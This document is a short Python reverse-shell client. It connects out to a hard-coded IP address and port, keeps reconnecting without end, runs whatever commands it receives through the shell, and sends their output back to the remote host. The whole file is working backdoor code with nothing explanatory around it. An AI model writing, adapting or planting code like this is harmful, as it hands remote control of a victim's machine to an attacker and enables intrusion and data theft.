import socket
import subprocess


class client:
    def __init__(self):
        self.ip = "192.168.1.104"  # Change this
        self.port = 1337  # Change this
        self.s = None

    def Connect(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.ip, self.port))
                self.cmds()
            except Exception:
                continue

    def cmds(self):
        while True:
            try:
                cmd = self.s.recv(1024).decode("utf-8")
                data = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.s.send(data.stdout.read())
                self.s.send(data.stderr.read())
            except socket.error as e:
                self.s.send(e.encode("utf-8"))
                self.s.close()

    def main(self):
        while True:
            try:
                if not self.Connect():
                    continue
            except KeyboardInterrupt:
                exit()


if __name__ == '__main__':
    run = client()
    run.main()
